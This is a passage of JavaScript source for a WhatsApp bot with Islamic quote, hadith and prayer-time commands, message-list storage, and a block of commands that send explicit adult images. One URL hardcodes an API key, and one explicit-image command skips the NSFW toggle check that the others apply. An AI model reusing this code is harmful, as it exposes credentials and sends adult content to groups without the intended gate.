    { id: "25", arabic: "مَنْ أَعاَنَكَ عَلىَ الشَّرِّ ظَلَمَكَ", translation_en: "Whoever helps you in wrongdoing has wronged you." }
  ];

  // Select a random quote
  const randomIndex = Math.floor(Math.random() * islami.length);
  const randomQuote = islami[randomIndex];
  const { arabic, translation_en } = randomQuote;

  // Format the response text
  const responseText = `${arabic}\n\n${translation_en}`;

  // Now send the image with the last reply
  const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
  await XliconBotInc.sendMessage(m.chat, {
    image: { url: imageUrl },
    caption: responseText
  });
}
break;

case 'assalamualaikum': {
  const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
  await XliconBotInc.sendMessage(m.chat, {
    image: { url: imageUrl },
    caption: "Waalaikumsalam Wa Rehmatullahi Wa Barakatuhu"
  });
}
break;



case 'hadith': {
  const apiUrl = 'https://api.lolhuman.xyz/api/hadits/detail/Sunan_Tirmidzi/1769?apikey=dcb4198762eb793a386a9c1c';

  try {
    // Fetch Hadith details from the API
    let response = await fetch(apiUrl);
    let data = await response.json();

    if (data.status !== 200) {
      return await XliconBotInc.sendText(m.chat, "Failed to fetch Hadith details.");
    }

    // Extract the Hadith text and ID
    let hadith = data.result['1'];
    let hadithText = hadith.nass;

    // Delay function to throttle requests
    function delay(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Translate function with retry logic
    async function translateText(text, targetLang) {
      let retries = 5;
      while (retries > 0) {
        try {
          await delay(500); // Delay between requests
          let result = await translate(text, { to: targetLang });
          return result.text;
        } catch (error) {
          console.error('Translation error:', error);
          if (error.message.includes('TooManyRequestsError')) {
            await delay(10000); // Wait for 10 seconds before retrying
          } else {
            return text; // Return original text if translation fails
          }
          retries -= 1;
        }
      }
      return text; // Return original text if all retries fail
    }

    // Translate the Hadith text to Urdu
    let translatedHadith = await translateText(hadithText, 'ur');

    // Create the caption with translations
    let captionText = `
*Hadith ID:* ${hadith.id}

❃ Original Text:
${hadithText}

❃ Translated Text (Urdu):
${translatedHadith}
`.trim();

    // Send the image with caption directly
    const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: captionText // Directly use captionText here
    });

  } catch (error) {
    console.error('Error fetching or processing Hadith:', error);
    return await XliconBotInc.sendText(m.chat, "An error occurred while fetching the Hadith.");
  }
}
break;


case 'prophetname': {
  try {
    // Define the API URL
    const apiUrl = `${global.api}islamic/prophet-names?apikey=${global.id}`;

    // Fetch data from the API
    let response = await fetch(apiUrl);
    let data = await response.json();

    // Check if the request was successful
    if (data.status !== 200) {
      return await XliconBotInc.sendText(m.chat, "Failed to fetch Prophet's name.");
    }

    // Extract the Prophet's name
    let prophetName = data.result.name;

    // Create the message content
    let captionText = `
*Prophet's Name:*
${prophetName}
`.trim();

    // Now send the image with the last reply
    const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
    await XliconBotInc.sendMessage(m.chat, {
      image: { url: imageUrl },
      caption: captionText // Directly use captionText here
    });

  } catch (error) {
    console.error('Error fetching Prophet\'s name:', error);
    return await XliconBotInc.sendText(m.chat, "An error occurred while fetching the Prophet's name.");
  }
}
break;

        
case 'prayertime': {
  // Extract the city name from the command input
  let city = m.text.split(' ').slice(1).join(' ');
  if (!city) {
      return await replygcxlicon("Please provide a city name, e.g., `prayertime Lahore`.");
  }

  // Define the API URL with the city parameter using global variables
  const apiUrl = `${global.api}islamic/prayer-times?city=${encodeURIComponent(city)}&apikey=${global.id}`;

  try {
      // Fetch data from the API
      let response = await fetch(apiUrl);
      let data = await response.json();

      // Check if the request was successful
      if (data.status !== 200 || data.result.status_valid !== 1) {
          return await replygcxlicon("Failed to fetch prayer times. Please check the city name and try again.");
      }

      // Assign emojis for each prayer time
      let fajrEmoji = '🌅';
      let dhuhrEmoji = '🌞';
      let asrEmoji = '🌤';
      let maghribEmoji = '🌇';
      let ishaEmoji = '🌙';

      // Extract relevant data
      let cityName = data.result.city;
      let method = data.result.prayer_method_name;
      let items = data.result.items[0];
      let fajr = fajrEmoji + ' Fajr: ' + items.fajr;
      let dhuhr = dhuhrEmoji + ' Dhuhr: ' + items.dhuhr;
      let asr = asrEmoji + ' Asr: ' + items.asr;
      let maghrib = maghribEmoji + ' Maghrib: ' + items.maghrib;
      let isha = ishaEmoji + ' Isha: ' + items.isha;

      // Create the message content
      let captionText = `
*Prayer Times for ${cityName}:*

${fajr}
${dhuhr}
${asr}
${maghrib}
${isha}

*Method:* ${method}
`.trim();

    
      // Now send the image with the last reply
      const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
      await XliconBotInc.sendMessage(m.chat, {
        image: { url: imageUrl },
        caption: captionText // Directly use captionText here
      });

  } catch (error) {
      console.error('Error fetching prayer times:', error);
      return await replygcxlicon("An error occurred while fetching the prayer times.");
  }
}
break;

case 'sahihbukhari': {
  // Supported languages
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'rus': 'Russian',
    'tr': 'Turkish',
    'ta': 'Tamil'
  };

  // If no language is specified, send the list of available languages
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let lang in languageNames) {
      languageList += `- ${languageNames[lang]} (${lang})\n`;
    }
    languageList += `\nPlease specify a language using the format: \`sahihbukhari <language code>\` (e.g., \`sahihbukhari en\`)`;
    return await replygcxlicon(languageList);
  }

  // Extract the language from the text (e.g., "en" from "sahihbukhari en")
  const lang = text.toLowerCase();

  // If the language is not valid, show the language options
  if (!languageNames[lang]) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let langCode in languageNames) {
      languageList += `- ${languageNames[langCode]} (${langCode})\n`;
    }
    languageList += `\nPlease choose a valid language.`;
    return await replygcxlicon(languageList);
  }

  // Generate a random Hadith number between 1 and 7560
  const randomHadithNumber = Math.floor(Math.random() * 7560) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-sahih-al-bukhari?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful and contains Hadith data
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}`;
        
      
        // Now send the image with the last reply
        const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
        await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: captionText // Use the Hadith caption here
        });
      } else {
        await XliconBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await XliconBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await XliconBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;

case 'jamiattirmidhi': {
  // Supported languages
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'tr': 'Turkish'
  };

  // If no language is specified, send the list of available languages
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let lang in languageNames) {
      languageList += `- ${languageNames[lang]} (${lang})\n`;
    }
    languageList += `\nPlease specify a language using the format: \`jamiattirmidhi <language code>\` (e.g., \`jamiattirmidhi en\`)`;
    return await replygcxlicon(languageList);
  }

  // Extract the language from the text (e.g., "en" from "jamiattirmidhi en")
  const lang = text.toLowerCase();

  // If the language is not valid, show the language options
  if (!languageNames[lang]) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let langCode in languageNames) {
      languageList += `- ${languageNames[langCode]} (${langCode})\n`;
    }
    languageList += `\nPlease choose a valid language.`;
    return await replygcxlicon(languageList);
  }

  // Generate a random Hadith number between 1 and 148
  const randomHadithNumber = Math.floor(Math.random() * 148) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-jami-at-tirmidhi?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful and contains Hadith data
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;
        
        // Send the Hadith text using replygcxlicon
        await replygcxlicon(captionText);

        // Now send the image with the final response
        const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
        await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: captionText // Use the Hadith caption here
        });
      } else {
        await XliconBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await XliconBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await XliconBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;


case 'sunanannasai': {
  // Supported languages
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'tr': 'Turkish'
  };

  // If no language is specified, send the list of available languages
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let lang in languageNames) {
      languageList += `- ${languageNames[lang]} (${lang})\n`;
    }
    languageList += `\nPlease specify a language using the format: \`sunanannasai <language code>\` (e.g., \`sunanannasai en\`)`;
    return await replygcxlicon(languageList); // Send with replygcxlicon for intermediate message
  }

  // Extract the language from the text (e.g., "en" from "sunanannasai en")
  const lang = text.toLowerCase();

  // If the language is not valid, show the language options
  if (!languageNames[lang]) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let langCode in languageNames) {
      languageList += `- ${languageNames[langCode]} (${langCode})\n`;
    }
    languageList += `\nPlease choose a valid language.`;
    return await replygcxlicon(languageList); // Send with replygcxlicon for invalid language
  }

  // Generate a random Hadith number between 1 and 324
  const randomHadithNumber = Math.floor(Math.random() * 324) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-sunan-nasai?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful and contains Hadith data
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;

       

        // Now send the final message with the image and caption
        const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
        await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: captionText // Attach the Hadith caption to the image
        });
      } else {
        await XliconBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await XliconBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await XliconBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;

case 'jamiattirmidhi': {
  // Supported languages
  const languageNames = {
    'ar': 'Arabic',
    'ur': 'Urdu',
    'en': 'English',
    'id': 'Indonesian',
    'bn': 'Bengali',
    'tr': 'Turkish'
  };

  // If no language is specified, send the list of available languages
  if (!text || !Object.keys(languageNames).includes(text.toLowerCase())) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let lang in languageNames) {
      languageList += `- ${languageNames[lang]} (${lang})\n`;
    }
    languageList += `\nPlease specify a language using the format: \`jamiattirmidhi <language code>\` (e.g., \`jamiattirmidhi en\`)`;
    return await replygcxlicon(languageList); // Send with replygcxlicon for intermediate message
  }

  // Extract the language from the text (e.g., "en" from "jamiattirmidhi en")
  const lang = text.toLowerCase();

  // If the language is not valid, show the language options
  if (!languageNames[lang]) {
    let languageList = 'Available languages for Hadith:\n\n';
    for (let langCode in languageNames) {
      languageList += `- ${languageNames[langCode]} (${langCode})\n`;
    }
    languageList += `\nPlease choose a valid language.`;
    return await replygcxlicon(languageList); // Send with replygcxlicon for invalid language
  }

  // Generate a random Hadith number between 1 and 148
  const randomHadithNumber = Math.floor(Math.random() * 148) + 1;

  try {
    // Fetch the Hadith from the API
    let url = `${global.api}islamic/hadith-jami-at-tirmidhi?q=${randomHadithNumber}/${lang}&apikey=${global.id}`;
    let response = await fetch(url);
    let data = await response.json();

    // Check if the response is successful and contains Hadith data
    if (data.status === 200 && data.result && data.result.data && data.result.data.hadiths) {
      let hadiths = data.result.data.hadiths;
      if (hadiths.length > 0) {
        // Display the Hadith
        let hadith = hadiths[0];
        let captionText = `*Hadith Number:* ${hadith.hadithnumber}\n`
                        + `*Text:* ${hadith.text}\n`
                        + `*Book:* ${hadith.reference.book}\n`
                        + `*Hadith:* ${hadith.reference.hadith}\n`
                        + `*Grades:*\n${hadith.grades.map(grade => `  *${grade.name}:* ${grade.grade}`).join('\n')}`;

        
        // Now send the final message with the image and caption
        const imageUrl = 'https://i.ibb.co/8NksWfT/ISLAM-IMAGE.png'; // Replace with the actual image URL
        await XliconBotInc.sendMessage(m.chat, {
          image: { url: imageUrl },
          caption: captionText // Attach the Hadith caption to the image
        });
      } else {
        await XliconBotInc.sendText(m.chat, "*No Hadith found for the given query.*");
      }
    } else {
      await XliconBotInc.sendText(m.chat, "*Failed to fetch Hadith. Please try again later.*");
    }
  } catch (error) {
    await XliconBotInc.sendText(m.chat, "*Error occurred while fetching Hadith.*");
  }
}
break;



 //------------------------------------------------------------------------------------------//

  case 'addlist':
if (!XliconTheCreator) return XliconStickOwner()
if (!m.isGroup) return XliconStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcxlicon(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return replygcxlicon(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(m.chat, args1, args2, true, `${mem}`, db_respon_list)
replygcxlicon(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
replygcxlicon(`Successful Add List With Key : *${args1}*`)
}
break

      
case 'dellist':
if (!XliconTheCreator) return XliconStickOwner()
if (!m.isGroup) return XliconStickGroup()
if (db_respon_list.length === 0) return replygcxlicon(`There is no message list in the database yet`)
if (!q) return replygcxlicon(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(m.chat, q, db_respon_list)) return replygcxlicon(`Item list by Name *${q}* not in the database!`)
delResponList(m.chat, q, db_respon_list)
replygcxlicon(`Successfully delete list message with key *${q}*`)
break
      
      
      
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygcxlicon(teks)
}
break
      
      
			case 'setprefix':
                if (!XliconTheCreator) return XliconStickOwner()
                if (!text) return replygcxlicon(`Example : ${prefix + command} #`)
                global.xprefix = text
                replygcxlicon(`Prefix successfully changed to ${text}`)
                break
      
      
      
			case 'addmsg': {
	if (!XliconTheCreator) return XliconStickOwner()
                if (!m.quoted) return replygcxlicon('Reply Message You Want To Save In Database')
                if (!text) return replygcxlicon(`Example : ${prefix + command} filename`)
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return replygcxlicon(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcxlicon(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
      
      
      
            case 'getmsg': {
                if (!text) return replygcxlicon(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return replygcxlicon(`'${text}' not listed in the message list`)
                XliconBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
      
      
      
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcxlicon(teks)
	    }
	    break 
      
      
      
	case 'delmsg': case 'deletemsg': {
		if (!XliconTheCreator) return XliconStickOwner()
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygcxlicon(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcxlicon(`Successfully deleted '${text}' from the message list`)
            }
	    break
      
      
      
			case 'setcmd': {
                if (!m.quoted) return replygcxlicon('Reply Message!')
                if (!m.quoted.fileSha256) return replygcxlicon('SHA256 Hash Missing')
                if (!text) return replygcxlicon(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcxlicon('You have no permission to change this sticker command')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcxlicon(`Done!`)
            }
            break
      
      
      
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcxlicon(`No hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcxlicon('You have no permission to delete this sticker command')             
                delete global.db.sticker[hash]
                replygcxlicon(`Done!`)
            }
            break
      
      
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                XliconBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
      
      
case 'lockcmd': {
                if (!XliconTheCreator) return XliconStickOwner()
                if (!m.quoted) return replygcxlicon('Reply Message!')
                if (!m.quoted.fileSha256) return replygcxlicon('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygcxlicon('Hash not found in database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygcxlicon('Done!')
            }
            break
      
  
 // HENTAII CMDS AHHH       
			case 'hentaivid': case 'hentai': case 'hentaivideo': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();
    const { hentai } = require('./lib/scraper.js');
    anu = await hentai();
    result912 = anu[Math.floor(Math.random() * anu.length)];

    // Prepare message details for video
    const videoDetails = `*Title:* ${result912.title}\n` +
                         `*Category:* ${result912.category}\n` +
                         `*Mimetype:* ${result912.type}\n` +
                         `*Views:* ${result912.views_count}\n` +
                         `*Shares:* ${result912.share_count}\n` +
                         `*Source:* ${result912.link}\n` +
                         `*Video Link:* ${result912.video_1}`;

    // Send video and details
    await XliconBotInc.sendMessage(m.chat, {
        video: { url: result912.video_1 },
        caption: videoDetails
    }, { quoted: m });
}
break;
        
case 'trap': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();
    try {
        // Fetch the trap image from the API
        const waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`);

        // Prepare the message details
        const imageDetails = `Hi ${m.pushName}\n_*Here is the result of ${command}*_`;

        // Send the image with the details
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: imageDetails
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching trap image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'hentai-neko':
case 'hneko': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    try {
        // Fetch the neko image from the API
        const waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`);

        // Prepare the caption text
        const imageDetails = `Hi ${m.pushName}\n_*Here is the result of ${command}*_`;

        // Send the image with the caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: imageDetails
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching hentai neko image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
        
case 'hentai-waifu':
case 'nwaifu': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    try {
        // Fetch the waifu image from the API
        const waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);

        // Prepare the caption text
        const imageDetails = `Hi ${m.pushName}\n_*Here is the result of ${command}*_`;

        // Send the image with the caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: imageDetails
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching hentai waifu image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'gasm': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Fetch image from the nekos.life API
        waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Gasm image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'milf': {
    if (!m.isGroup) return XliconStickGroup();

    await XliconStickWait();

    try {
        // Load Milf images from file
        var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'));

        // Pick a random result
        var xliconyresult = pickRandom(ahegaonsfw);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: xliconyresult.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Milf image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animespank': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Fetch image from the nekos.life API
        waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeSpank image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'blowjob': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Load Blowjob images from file
        var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'));

        // Pick a random result
        var xliconyresult = pickRandom(ahegaonsfw);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: xliconyresult.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Blowjob image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'cuckold': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Load Cuckold images from file
        var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'));

        // Pick a random result
        var xliconyresult = pickRandom(ahegaonsfw);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: xliconyresult.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Cuckold image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

        
case 'eba': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Load Eba NSFW images from file
        var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'));

        // Pick a random result
        var xliconyresult = pickRandom(ahegaonsfw);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: xliconyresult.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Eba image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'pussy': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Load Pussy NSFW images from file
        var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'));

        // Pick a random result
        var xliconyresult = pickRandom(ahegaonsfw);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: xliconyresult.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Pussy image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'yuri': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Load Yuri NSFW images from file
        var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'));

        // Pick a random result
        var xliconyresult = pickRandom(ahegaonsfw);

        // Send the image with caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: xliconyresult.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Yuri image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

        
case 'zettai': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Load Zettai NSFW images from file
        var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'));

        // Pick a random result
        var xliconyresult = pickRandom(ahegaonsfw);

        // Prepare the message with the image
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: xliconyresult.url },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching Zettai image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'gifblowjob': {
    if (!m.isGroup) return XliconStickGroup();
    if (!AntiNsfw) return replygcxlicon(mess.nsfw);

    await XliconStickWait();

    try {
        // Fetch the blowjob gif from the API
        let assss = await axios.get("https://api.waifu.pics/nsfw/blowjob");

        // Download the gif and prepare the buffer
        var bobuff = await fetchBuffer(assss.data.url);
        var bogif = await buffergif(bobuff);

        // Send the gif with the caption
        await XliconBotInc.sendMessage(m.chat, {
            video: { url: bogif },
            caption: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`,
            gifPlayback: true
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching blowjob gif:', error);
        replygcxlicon('⚠️ An error occurred while fetching the gif. Please try again later.');
    }
}
break;

//END HENTAII CMDS AHHHH
        
    case 'animeawoo': {
    await XliconStickWait();

    try {
        // Fetch Awoo image from the waifu.pics API
        waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeAwoo image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

        
case 'animemegumin': {
    await XliconStickWait();
    try {
        // Fetch Megumin image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`);

        // Send the image with a caption
